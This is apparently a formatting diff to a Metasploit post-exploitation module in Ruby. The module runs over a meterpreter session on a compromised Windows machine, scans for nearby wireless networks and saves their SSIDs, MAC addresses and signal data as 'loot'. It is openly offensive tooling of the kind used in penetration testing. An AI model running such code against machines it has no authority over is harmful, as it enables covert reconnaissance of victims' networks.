@@ -14,52 +14,50 @@ require 'rex'
 
 
 class Metasploit3 < Msf::Post
-	
 	include Msf::Auxiliary::Report
 
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Gather Wireless BSS Info',
-				'Description'   => %q{
-					This module gathers information about the wireless Basic Service Sets
-					available to the victim machine.
+			'Name'          => 'Windows Gather Wireless BSS Info',
+			'Description'   => %q{
+				This module gathers information about the wireless Basic Service Sets
+				available to the victim machine.
 				},
-				'License'       => MSF_LICENSE,
-				'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter' ]
-			))
+			'License'       => MSF_LICENSE,
+			'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter' ]
+		))
 	end
 
 	def run
-	
+
 		#Opens memory access into the host process
 		mypid = client.sys.process.getpid
 		@host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
 		@wlanapi = client.railgun.wlanapi
-		
+
 		wlan_connections= "Wireless LAN Active Connections: \n"
-				
-		
+
 		wlan_handle = open_handle()
-		
+
 		wlan_iflist = enum_interfaces(wlan_handle)
-		
+
 		networks = []
-		
+
 		wlan_iflist.each do |interface|
 			#Scan with the interface, then wait 10 seconds to give it time to finish
 			#If we don't wait we can get unpredicatble results. May be a race condition		
 			scan_results = @wlanapi.WlanScan(wlan_handle,interface['guid'],nil,nil,nil)
 			sleep(10)
-			
+
 			#Grab the list of available Basic Service Sets
 			bss_list = wlan_get_networks(wlan_handle,interface['guid'])
 			networks << bss_list
 		end
-		
+
 		#flatten and uniq the array to try and keep a unique lsit of networks
 		networks.flatten!
 		networks.uniq!
@@ -74,8 +72,7 @@ class Metasploit3 < Msf::Post
 		#strip out any nullbytes for safe loot storage
 		network_list.gsub!(/\x00/,"")
 		store_loot("host.windows.wlan.networks", "text/plain", session, network_list, "wlan_networks.txt", "Available Wireless LAN Networks")
-		
-		
+
 		#close the Wlan API Handle
 		closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
 		if closehandle['return'] == 0
@@ -88,7 +85,6 @@ class Metasploit3 < Msf::Post
 
 
 	def open_handle 
-	
 		begin
 			wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
 		rescue
@@ -96,43 +92,42 @@ class Metasploit3 < Msf::Post
 			return nil
 		end
 		return wlhandle['phClientHandle']
-	
 	end
 
 
 	def wlan_get_networks(wlan_handle,guid)
-	
+
 		networks = []
-	
+
 		bss_list = @wlanapi.WlanGetNetworkBssList(wlan_handle,guid,nil,3,true,nil,4)
 		print_status(bss_list.inspect)
-		
+
 		pointer = bss_list['ppWlanBssList']
 		totalsize = @host_process.memory.read(pointer,4)
 		totalsize = totalsize.unpack("V")[0]
-		
+
 		pointer = (pointer + 4)
 		numitems = @host_process.memory.read(pointer,4)
 		numitems = numitems.unpack("V")[0]
-		
+
 		print_status("Number of Networks: #{numitems}")
-		
+
 		#Iterate through each BSS
 		(1..numitems).each do |i|
 			bss={}
-			
+
 			#If the length of the SSID is 0 then something is wrong. Skip this one
 			pointer = (pointer + 4)
 			len_ssid = @host_process.memory.read(pointer,4)
 			unless len_ssid.unpack("V")[0] 
 				next
 			end
-			
+
 			#Grabs the ESSID
 			pointer = (pointer + 4)
 			ssid = @host_process.memory.read(pointer,32)
 			bss['ssid'] = ssid.gsub(/\x00/,"")
-			
+
 			#Grab the BSSID/MAC Address of the AP
 			pointer = (pointer + 36)
 			bssid = @host_process.memory.read(pointer,6)
@@ -143,7 +138,7 @@ class Metasploit3 < Msf::Post
 			bssid.insert(11,":")
 			bssid.insert(14,":")
 			bss['bssid'] = bssid
-			
+
 			#Get the BSS Type
 			pointer = (pointer + 8)
 			bsstype = @host_process.memory.read(pointer,4)
@@ -158,7 +153,7 @@ class Metasploit3 < Msf::Post
 				else
 					bss['type'] = "Unknown BSS Type"
 			end
-			
+
 			#Get the Physical Association Type
 			pointer = (pointer + 4)
 			phy_type = @host_process.memory.read(pointer,4)
@@ -181,47 +176,39 @@ class Metasploit3 < Msf::Post
 				else
 					bss['physical'] = "Unknown Association Type"
 			end
-			
+
 			#Get the Recieved Signal Strength Indicator
 			pointer = (pointer + 4)
 			rssi = @host_process.memory.read(pointer,4)
 			rssi = getle_signed_int(rssi)
 			bss['rssi'] = rssi 
-			
+
 			#Get the signal strength
 			pointer = (pointer + 4)
 			signal = @host_process.memory.read(pointer,4)
 			bss['signal'] = signal.unpack("V")[0]
-			
+
 			#skip all the rest of the data points as they aren't particularly useful
 			pointer = (pointer + 296)
-			
+
 			networks << bss
-		
 		end
-		
 		return networks
-	
 	end
 
-
-	
 	def enum_interfaces(wlan_handle)
-	
-			
+
 		iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
 		pointer= iflist['ppInterfaceList']
-		
+
 		numifs = @host_process.memory.read(pointer,4)
 		numifs = numifs.unpack("V")[0]
-		
-		
+
 		interfaces = []
-		
+
 		#Set the pointer ahead to the first element in the array
 		pointer = (pointer + 8)
 		(1..numifs).each do |i|
-		
 			interface = {}
 			#Read the GUID (16 bytes)
 			interface['guid'] = @host_process.memory.read(pointer,16)
@@ -232,7 +219,6 @@ class Metasploit3 < Msf::Post
 			#Read the state of the interface (4 bytes)
 			state = @host_process.memory.read(pointer,4)
 			pointer = (pointer + 4)
-			
 			#Turn the state into human readable form
 			state = state.unpack("V")[0]
 			case state
@@ -257,9 +243,7 @@ class Metasploit3 < Msf::Post
 			end
 			interfaces << interface
 		end
-	
 		return interfaces
-	
 	end
 
 	def getle_signed_int(str)
@@ -270,17 +254,14 @@ class Metasploit3 < Msf::Post
 		end
 		num >= 2**(bits-1) ? num - 2**bits : num 
 	end
-	
+
 	#Convert the GUID to human readable form
 	def guid_to_string(guid)
-	
 		aguid = guid.unpack("H*")[0]
-		
 		sguid = "{" + aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2] 
 		sguid << "-" + aguid[10,2] +  aguid[8,2] + "-" + aguid[14,2] + aguid[12,2] + "-" +  aguid[16,4]
 		sguid << "-" + aguid[20,12] + "}"
 		return sguid
-
 	end
 
 end
